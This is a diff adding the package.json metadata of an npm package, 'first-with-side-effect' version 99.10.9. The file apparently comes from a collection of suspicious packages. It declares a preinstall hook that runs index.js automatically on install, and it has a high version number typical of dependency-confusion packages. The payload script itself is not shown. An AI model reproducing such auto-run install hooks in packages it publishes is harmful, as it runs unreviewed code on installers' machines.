@@ -1,0 +1,39 @@
+{
+    "name": "first-with-side-effect",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "first-with-side-effect@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-TXtU/XNwbv6VA4Rv01JPpWmYQig/kUkfibGcoGbn7dobHjM1yvbG7/CFX1G81Cjhdnv4Zf382AU9mMPMqceFYw==",
+        "shasum": "46c11e17b710e5009a7c73cc9261e1c234c22e51",
+        "tarball": "https://registry.npmjs.org/first-with-side-effect/-/first-with-side-effect-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5074,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPIIfACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmo3OA//fWi0ICfyOuGC1ZBRlEOjh7u5SmWN75WPCr+Cq4SjumiG5ZLg\r\nm1rfIWmL3VA1wgNaRk2O6pY5XTX/h0zKSA+OtNExNUnJN9tfYgiLmdci/Ry1\r\n7rAaExT6sPGmL0Vyju77Clcks/XQ64sQHX2V7vsvB/N8Hq/QJEcQ7JEj0fLT\r\n/RENoL1YW2PZVFtkFdX7Y4jnunm7tMUIQRnQ5JG73xZoGvkEOgHhbUSZ6gED\r\nYSnBrbH76SNI/X0RchxgWwRayvwb9gm12xkLqyejfEXIEk3emQ1nFWYzTa+y\r\n3Y+7r+r9m+arYWUJgFwKDCPB9ZXV5ugqO4XzvEWSeVt5GnKy4vOX3KanqpzH\r\nYkxberCdEQtS/vCiW0EkrRGn7MYxjQEQ9nK7SatDnTRJpzat6GHxxGiyMwl9\r\nBIR6wjMuVkAfM9w+lYQXwyWqKnvAn9D0vk0GLQz8O3T51x63K0WzO7fMIPnb\r\nC7t/10yhb983eetY+cLzewsyHgLy6y9mA5dL8bjsaNzjLXCF2je246vzMsPp\r\nQf78albJa3m8zUc2RJEWCHnYhP3+K+Y+RhmYtq1WRJut7a+ep/Y8e31Np63N\r\nOB+xLUXU7X9UxKb4BzkAz97N2jVr9WRgSfePqidDxcW5CvMwjZ1N1SsH5P64\r\nG+tLzRe0+reBeifgfB6k+GdCKrziCnM/eAk=\r\n=ZvXH\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "kdku83mn",
+        "email": "kdku83mn@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "kdku83mn",
+            "email": "kdku83mn@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/first-with-side-effect_99.10.9_1648132639480_0.4468126093125395"
+    },
+    "_hasShrinkwrap": false
+}
